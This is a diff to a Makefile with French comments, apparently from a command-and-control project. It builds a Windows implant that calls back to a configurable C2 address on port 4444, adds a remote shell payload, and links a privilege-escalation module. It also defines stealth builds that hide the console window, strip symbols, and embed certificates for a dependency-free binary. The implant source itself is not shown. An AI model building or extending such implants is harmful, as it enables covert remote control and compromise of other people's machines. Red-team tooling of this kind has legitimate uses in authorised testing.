@@ -27,7 +27,7 @@ C2_PORT ?= 4444
 IMPLANT_DIR = ../../implant/core
 
 # Libs Windows communes à l'implant
-WIN_LIBS = -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32
+WIN_LIBS = -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -lshell32 -liphlpapi
 
 .PHONY: all server implant implant-debug implant-standalone embed certs clean
 
@@ -38,20 +38,22 @@ server: c2_server.c tls.c tls.h
 	@echo "[+] c2_server compilé (multi-client)"
 
 # Production : -mwindows = aucune fenêtre visible, -s = strip des symboles
-implant: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h
+implant: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(IMPLANT_DIR)/../payloads/shell.c $(IMPLANT_DIR)/../payloads/shell.h
 	gcc $(CFLAGS) \
 		-I. -I$(IMPLANT_DIR) \
 		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
 		-o implant.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
+		$(IMPLANT_DIR)/../payloads/shell.c \
 		$(WIN_LIBS) -static -s -mwindows
 	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT)) — sans fenêtre, nécessite .env + certs/"
 
 # Debug : pas de -mwindows (console visible), pas de -s (symboles conservés)
-implant-debug: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h
+implant-debug: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(IMPLANT_DIR)/../payloads/shell.c $(IMPLANT_DIR)/../payloads/shell.h
 	gcc $(CFLAGS) \
 		-I. -I$(IMPLANT_DIR) \
 		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
 		-o implant_debug.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
+		$(IMPLANT_DIR)/../payloads/shell.c \
 		$(WIN_LIBS) -static
 	@echo "[+] implant_debug.exe généré ($(C2_IP):$(C2_PORT)) — avec console debug"
 
@@ -60,11 +62,12 @@ embed: gen-embed.sh
 	@echo "[+] embedded_certs.h généré"
 
 # Standalone : certs embarqués + sans fenêtre
-implant-standalone: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h embedded_certs.h
+implant-standalone: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(IMPLANT_DIR)/../payloads/shell.c $(IMPLANT_DIR)/../payloads/shell.h embedded_certs.h
 	gcc $(CFLAGS) \
 		-I. -I$(IMPLANT_DIR) \
 		-DEMBED_CERTS -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
 		-o implant.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
+		$(IMPLANT_DIR)/../payloads/shell.c \
 		$(WIN_LIBS) -static -s -mwindows
 	@echo "[+] implant.exe standalone généré ($(C2_IP):$(C2_PORT)) — sans fenêtre, zéro dépendance"
 
